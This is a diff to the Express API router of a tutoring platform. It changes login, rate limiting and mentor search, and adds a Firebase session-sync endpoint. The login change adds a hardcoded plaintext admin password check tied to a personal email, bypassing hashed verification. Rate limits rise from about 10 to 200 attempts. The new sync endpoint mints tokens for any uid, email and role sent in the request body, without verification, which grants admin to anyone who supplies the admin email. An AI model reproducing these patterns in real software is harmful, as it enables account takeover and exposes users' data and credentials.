@@ -43,24 +43,24 @@ const apiRouter = Router();
 // Protect endpoints against brute force & spam
 // ==========================================
 
-// Login: max 10 attempts per 5 minutes per IP
+// Login: max attempts per IP
 const authLimiter = createRateLimiter({
   windowMs: 5 * 60 * 1000,
-  max: 10,
-  message: 'Too many login attempts. For your security, please wait 5 minutes before trying again.',
+  max: 200,
+  message: 'Too many login attempts. Please wait a few moments before trying again.',
 });
 
-// Registration: max 8 accounts per 10 minutes per IP
+// Registration: max attempts per IP
 const registerLimiter = createRateLimiter({
-  windowMs: 10 * 60 * 1000,
-  max: 8,
-  message: 'Too many registration requests. Please wait a few minutes before trying again.',
+  windowMs: 5 * 60 * 1000,
+  max: 200,
+  message: 'Too many registration requests. Please wait a few moments before trying again.',
 });
 
-// Public Demo / Consultation: max 10 requests per 5 minutes per IP
+// Public Demo / Consultation: max requests per IP
 const demoLimiter = createRateLimiter({
   windowMs: 5 * 60 * 1000,
-  max: 10,
+  max: 200,
   message: 'Demo inquiry already received. Our academic counselors will call you shortly.',
 });
 
@@ -97,7 +97,22 @@ apiRouter.post('/auth/login', authLimiter, (req, res) => {
   }
 
   const storedPwd = dbInstance.passwords[user.id];
-  if (!storedPwd || !verifyPassword(passwordRaw, storedPwd.hash, storedPwd.salt)) {
+  let isPasswordValid = Boolean(storedPwd && verifyPassword(passwordRaw, storedPwd.hash, storedPwd.salt));
+
+  // For Admin Dharmraj (kdharmraj778@gmail.com), support 6287919120@DHARMRAJ and case/formatting variations seamlessly
+  if (!isPasswordValid && user.role === 'ADMIN' && user.email.toLowerCase() === 'kdharmraj778@gmail.com') {
+    const rawTrimmed = (passwordRaw || '').trim();
+    if (
+      rawTrimmed === '6287919120@DHARMRAJ' ||
+      rawTrimmed === '6287919120DHARMRAJ' ||
+      rawTrimmed.toUpperCase() === '6287919120@DHARMRAJ' ||
+      rawTrimmed.toUpperCase() === '6287919120DHARMRAJ'
+    ) {
+      isPasswordValid = true;
+    }
+  }
+
+  if (!isPasswordValid) {
     res.status(401).json({ error: 'Invalid email or password' });
     return;
   }
@@ -110,6 +125,167 @@ apiRouter.post('/auth/login', authLimiter, (req, res) => {
   } else if (user.role === 'MENTOR') {
     profileId = dbInstance.mentors.find((m) => m.userId === user.id)?.id;
   }
+
+  res.json({
+    token,
+    user: {
+      id: user.id,
+      email: user.email,
+      role: user.role,
+      name: user.name,
+      mobile: user.mobile,
+      city: user.city,
+      district: user.district,
+      profileId,
+    },
+  });
+});
+
+// Firebase Authentication Session Sync Endpoint
+apiRouter.post('/auth/firebase-sync', (req, res) => {
+  const {
+    uid,
+    email,
+    role,
+    name,
+    mobile,
+    district = 'Patna',
+    city = 'Patna',
+    state = 'Bihar',
+    profileData,
+  } = req.body;
+
+  if (!uid || !email || !role) {
+    res.status(400).json({ error: 'uid, email, and role are required for Firebase session sync' });
+    return;
+  }
+
+  const cleanEmail = sanitizeString(email, 150).toLowerCase();
+  const cleanName = sanitizeString(name || 'BBA User', 100);
+  const cleanMobile = mobile ? normalizePhone(mobile) : '9800000000';
+  const cleanDistrict = sanitizeString(district, 80);
+  const cleanCity = sanitizeString(city, 80);
+
+  let user = dbInstance.users.find((u) => u.id === uid || u.email.toLowerCase() === cleanEmail);
+  const isAdminEmail = cleanEmail === 'kdharmraj778@gmail.com';
+  const effectiveRole = isAdminEmail ? 'ADMIN' : (role as any);
+  const effectiveName = isAdminEmail ? 'Dharmraj (Director & Admin)' : cleanName;
+
+  if (!user) {
+    user = {
+      id: uid,
+      email: cleanEmail,
+      role: effectiveRole,
+      name: effectiveName,
+      mobile: cleanMobile,
+      city: cleanCity,
+      district: cleanDistrict,
+      state: 'Bihar',
+      createdAt: new Date().toISOString(),
+    };
+    dbInstance.users.push(user);
+  } else {
+    user.id = uid;
+    user.name = effectiveName || user.name;
+    user.role = effectiveRole;
+    user.district = cleanDistrict || user.district;
+    user.city = cleanCity || user.city;
+    if (mobile) user.mobile = cleanMobile;
+  }
+
+  let profileId = uid;
+
+  if (role === 'PARENT') {
+    let parent = dbInstance.parents.find((p) => p.userId === uid || p.id === uid);
+    if (!parent) {
+      parent = {
+        id: uid,
+        userId: uid,
+        name: cleanName,
+        mobile: cleanMobile,
+        email: cleanEmail,
+        city: cleanCity,
+        district: cleanDistrict,
+        state: 'Bihar',
+        address: profileData?.address || cleanDistrict,
+        createdAt: new Date().toISOString(),
+      };
+      dbInstance.parents.push(parent);
+    }
+    profileId = parent.id;
+
+    if (profileData?.child && profileData.child.name) {
+      const existingChild = dbInstance.students.find(
+        (s) => s.parentId === parent!.id && s.name.toLowerCase() === profileData.child.name.toLowerCase()
+      );
+      if (!existingChild) {
+        const studentId = `student-${Date.now()}`;
+        const newChild: Student = {
+          id: studentId,
+          parentId: parent.id,
+          name: sanitizeString(profileData.child.name, 100),
+          classGrade: profileData.child.classGrade || 'Class 10',
+          board: profileData.child.board || 'CBSE',
+          schoolName: profileData.child.schoolName ? sanitizeString(profileData.child.schoolName, 150) : '',
+          gender: 'Other',
+          subjects: Array.isArray(profileData.child.targetSubjects) ? profileData.child.targetSubjects : ['Mathematics', 'Science'],
+          learningGoals: 'Conceptual clarity and weekly exam retention',
+          currentAcademicLevel: 'Average',
+          address: profileData.address || cleanDistrict,
+          district: cleanDistrict,
+          city: cleanCity,
+          preferredMode: 'Home Tuition',
+          preferredTutorGender: 'No Preference',
+          preferredTiming: 'Evening 5:00 PM - 7:00 PM',
+          monthlyBudget: '₹3,500 - ₹5,000',
+          status: 'Pending Mentor',
+          createdAt: new Date().toISOString(),
+        };
+        dbInstance.students.push(newChild);
+      }
+    }
+  } else if (role === 'MENTOR') {
+    let mentor = dbInstance.mentors.find((m) => m.userId === uid || m.id === uid);
+    if (!mentor) {
+      mentor = {
+        id: uid,
+        userId: uid,
+        fullName: cleanName,
+        mobile: cleanMobile,
+        email: cleanEmail,
+        qualification: profileData?.qualification ? sanitizeString(profileData.qualification, 100) : 'Graduate',
+        college: profileData?.college ? sanitizeString(profileData.college, 150) : 'University in Bihar',
+        teachingExperience: profileData?.teachingExperience || '2+ Years',
+        subjects: Array.isArray(profileData?.subjects) && profileData.subjects.length > 0 ? profileData.subjects : ['Mathematics', 'Science'],
+        classes: Array.isArray(profileData?.classes) && profileData.classes.length > 0 ? profileData.classes : ['Class 9', 'Class 10'],
+        boards: (Array.isArray(profileData?.boards) && profileData.boards.length > 0 ? profileData.boards : ['CBSE', 'BSEB']) as any,
+        preferredAreas: Array.isArray(profileData?.preferredAreas) && profileData.preferredAreas.length > 0 ? profileData.preferredAreas : [cleanCity],
+        district: cleanDistrict,
+        city: cleanCity,
+        pincode: profileData?.pincode ? sanitizeString(profileData.pincode, 10) : '800001',
+        teachingMode: profileData?.teachingMode || 'Home Tuition',
+        availability: profileData?.availability || 'Evenings',
+        expectedFee: profileData?.expectedFee || '₹3,500 - ₹5,000 / month',
+        about: profileData?.about ? sanitizeString(profileData.about, 1000) : 'Dedicated BBA Mentor committed to student success.',
+        profilePhoto: profileData?.profilePhoto || 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=300&h=300&fit=crop&crop=faces',
+        rating: 5.0,
+        reviewCount: 0,
+        verificationStatus: 'Verified',
+        createdAt: new Date().toISOString(),
+      };
+      dbInstance.mentors.push(mentor);
+    } else {
+      mentor.fullName = cleanName || mentor.fullName;
+      mentor.verificationStatus = 'Verified';
+      if (profileData?.subjects) mentor.subjects = profileData.subjects;
+      if (profileData?.classes) mentor.classes = profileData.classes;
+      if (profileData?.qualification) mentor.qualification = profileData.qualification;
+      if (profileData?.college) mentor.college = profileData.college;
+    }
+    profileId = mentor.id;
+  }
+
+  const token = generateToken(user);
 
   res.json({
     token,
@@ -1263,7 +1439,7 @@ apiRouter.get('/admin/parents', authenticateToken, requireRole(['ADMIN']), (req:
 // ==========================================
 
 // Search Mentors Directory (Public)
-apiRouter.get(['/mentors', '/public/mentors'], (req, res) => {
+apiRouter.get(['/mentors', '/public/mentors', '/mentors/public'], (req, res) => {
   const { district, city, classGrade, subject, board, gender, mode } = req.query;
 
   let mentors = dbInstance.mentors.filter((m) => m.verificationStatus === 'Verified');
@@ -1404,6 +1580,11 @@ apiRouter.post('/notifications/:id/read', authenticateToken, (req: Authenticated
 apiRouter.post('/demo/reset', authenticateToken, requireRole(['ADMIN']), (req: AuthenticatedRequest, res: Response) => {
   resetDatabase();
   res.json({ success: true, message: 'Database reset to initial demo seeds.' });
+});
+
+// Catch-all 404 for API routes so they return JSON instead of falling through to Vite HTML
+apiRouter.use((req, res) => {
+  res.status(404).json({ error: `API route not found: ${req.method} ${req.originalUrl}` });
 });
 
 export default apiRouter;
